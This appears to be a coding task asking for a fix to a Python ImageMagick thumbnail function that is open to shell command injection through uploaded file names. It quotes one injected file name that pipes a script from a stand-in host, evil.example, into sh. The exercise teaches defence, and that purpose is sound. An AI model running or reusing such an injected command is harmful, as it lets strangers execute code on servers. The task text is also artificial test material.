`make_thumbnail(source, width, *, run=subprocess.run)` resizes an uploaded photo with ImageMagick
and returns the thumbnail's path. The upload's file name, and the width, both come from a web form.
It works in the demo, and a security review found this:

```python
make_thumbnail("uploads/photo.jpg; curl https://evil.example/x.sh | sh; #.jpg", 200)
# runs magick, then downloads and runs a stranger's script
```

Fix it so that:

- the command is an **argument list**, with no shell: `["magick", source, "-resize", "<width>x", target]`;
- a failed resize raises instead of returning quietly (`check=True`), and a stuck one gives up
  (a `timeout` of at most 120 seconds);
- `width` must be a positive `int`; anything else raises `ValueError` before anything runs.

The target path is unchanged: the source with its extension replaced by `-thumb.jpg`.

```python
make_thumbnail("uploads/photo 1.jpg", 200)
# runs ["magick", "uploads/photo 1.jpg", "-resize", "200x", "uploads/photo 1-thumb.jpg"]
# returns "uploads/photo 1-thumb.jpg"
```

(`run` is a parameter so the tests can pass a fake; in the browser nothing can start a process.)
